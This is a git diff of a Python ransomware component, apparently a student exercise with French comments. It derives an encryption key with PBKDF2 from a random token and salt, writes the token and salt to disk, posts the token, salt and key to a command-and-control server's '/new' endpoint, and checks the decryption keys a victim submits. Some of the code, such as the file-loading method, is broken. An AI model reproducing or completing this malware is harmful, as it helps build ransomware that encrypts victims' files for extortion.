@@ -30,21 +30,21 @@ class SecretManager:
 
 
     def do_derivation(self, salt:bytes, key:bytes)->bytes:
-        
-        self._salt = salt
-        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length = SecretManager.KEY_LENGTH, SALT = self._salt, iterations = SecretManager.ITERATION)
-        self._key = kdf.derive(key)
 
-        return self._key
+        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length = SecretManager.KEY_LENGTH, salt = salt, iterations = SecretManager.ITERATION)
+        key = kdf.derive(key)
+
+        return key
 
 
     def create(self)->Tuple[bytes, bytes, bytes]:
         
-        self._key = os.urandom(SecretManager.KEY_LENGTH)
-        self._salt = os.urandom(SecretManager.SALT_LENGTH)
-        self._token = os.urandom(SecretManager.TOKEN_LENGTH)
+        salt = os.urandom(SecretManager.SALT_LENGTH)
+        token = os.urandom(SecretManager.TOKEN_LENGTH)
         
-        return [self._key, self._salt, self._token]
+        key = self.do_derivation(salt, token)
+
+        return [salt, token, key]
 
 
     def bin_to_b64(self, data:bytes)->str:
@@ -54,57 +54,93 @@ class SecretManager:
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         
+        url = f"http://{self._remote_host_port}/new"
+        print(f"url d'envoi : {url}")
+
         elements = {
             "token" : self.bin_to_b64(token),
             "salt" : self.bin_to_b64(salt),
             "key" : self.bin_to_b64(key)
         }
+
         jsonElements = json.dumps(elements)
-        requests.post(self._remote_host_port, jsonElements)
+
+        print("Envoi des éléments par une requête post")
+        reponse = requests.post(url, json = jsonElements)
+        print("Éléments envoyés !")
+
+        if reponse.status_code != 200:
+            self._log(f"Erreur : {reponse.text}")
+        else:
+            self._log(f"Les données ont été envoyées au CNC")
         
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
 
+        print("Initialisation de la fonction setup...")
+
+        print("On vérifie si le fichier est présent dans le répertoire")
         # on vérifie si le fichier est présent dans le répertoire
         if os.path.exists("token.bin"):
             file = open(self._path + "/token.bin", "rb")
             self._token = file.read()
             file.close()
-
+        
+        
         else:
+            print("le fichier n'est pas présent dans le répertoire")
              #création des éléments cryptographiques
-            self._key, self._salt, self._token = self.create()
+            salt, token, key = self.create()
 
             #si le fichier n'est pas présent dans le répertoire, on le crée
             if os.path.exists(self._path):
                 with open(os.path.join(self._path, "token.bin"), "wb") as file_token:
-                    file_token.write(self._token)
+                    file_token.write(token)
                     file_token.close()
 
             else :
                 os.mkdir(self._path)
                 with open(os.path.join(self._path, "token.bin"), "wb") as file_token:
-                    file_token.write(self._token)
+                    file_token.write(token)
                     file_token.close()
             
         with open(os.path.join(self._path, "salt.bin"), "wb") as file_salt:
-            file_salt.write(self._salt)
+            file_salt.write(salt)
             file_salt.close()
-    
+
+        print("Envoi des éléments au CNC...")
+        #envoi des éléments au CNC
+        self.post_new(salt, key, token)
+        print("Éléments envoyés !")
+
 
     def load(self)->None:
         # function to load crypto data
 
         with open(self._path, "token.bin") as file_token:
-            token_to_send = file_token.read("token.bin")
+            self._token = file_token.read("token.bin")
+
+        self._log("Token chargé")
 
         with open(self._path, "salt.bin") as file_salt:
-            salt_to_send = file_salt.read("salt.bin")
+            self._salt = file_salt.read("salt.bin")
+        
+        self._log("Salt chargé")
+
 
     def check_key(self, candidate_key:bytes)->bool:
+        self._log("Vérification de la clé...")
         # Assert the key is valid
-        raise NotImplemented()
+        
+        self.load()
+        if candidate_key == self.do_derivation(self._salt, self._token):
+            self._log("Good key!")
+            return True
+        else:
+            if candidate_key != self.do_derivation(self._salt, self._token):
+                self._log("Wrong key!")
+                return False
 
 
     def set_key(self, b64_key:str)->None:
